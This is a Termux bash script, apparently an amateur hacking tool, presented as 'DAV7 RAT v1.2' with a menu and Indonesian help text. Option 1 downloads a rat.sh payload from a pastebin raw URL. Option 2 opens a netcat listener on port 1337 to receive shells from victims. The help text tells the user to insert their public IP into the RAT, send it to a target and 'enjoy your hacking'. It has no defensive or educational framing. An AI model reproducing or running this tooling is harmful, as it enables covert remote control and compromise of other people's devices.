#!/data/data/com.termux/files/usr/bin/bash
# coded By user01_73r14r4ng
# Bersihkan Layar
clear

blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\e[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
clear
echo -e $red"============================================"
echo -e $cyan"[+]DAV7 RAT v1.2[+]"
echo -e $cyan"[+]Author By ./DAV7[+]"
echo -e "$red============================================"
echo -e $red"1) create rat"
echo -e $red"2) connect rat for target"
echo -e $white"3) help"
echo -e $white"4) exit"
read -p "[User01_73r14r4ng@Tools]> " DAV7;

if [ $DAV7 = 01 ] || [ $DAV7 = 1 ]
then
clear
echo -e $cyan"[+]please wait....\n"
sleep 3
echo -e $cyan"[+]create your rat..\n"
sleep 2
apt-get update
apt-get install wget
apt-get install netcat
wget -O rat.sh https://pastebin.com/raw/rgLiXwE9
sleep 1
echo $red"[+]done your create"
fi
if [ $DAV7 = 02 ] || [ $DAV7 = 2 ]
then
clear
apt-get install netcat
clear
echo -e $red"[+]please wait connection mastah"
sleep 1
echo -e $white"[+]please wait connection target"
nc -l -p 1337
fi
if [ $DAV7 = 03 ] || [ $DAV7 = 3 ]
then
clear
echo "[+]TUTORIAL MENGGUNAKAN DAV7 RAT [+]"
echo "[+]create rat nya dulu cok"
echo "[+]edit rat.sh nya ganti 127.0.0.1 dengan ip public mu"
echo "[+]default port 1337"
echo "[+]koneksi kan ke target"
echo "[+]send rat ke target"
echo "[+]enjoy your hacking"
fi
if [ $DAV7 = 04 ] || [ $DAV7 = 4 ]
then
echo -e $red"thanks sudah make tools saya"
sleep 1
echo -e $red"bye ea :*"
fi
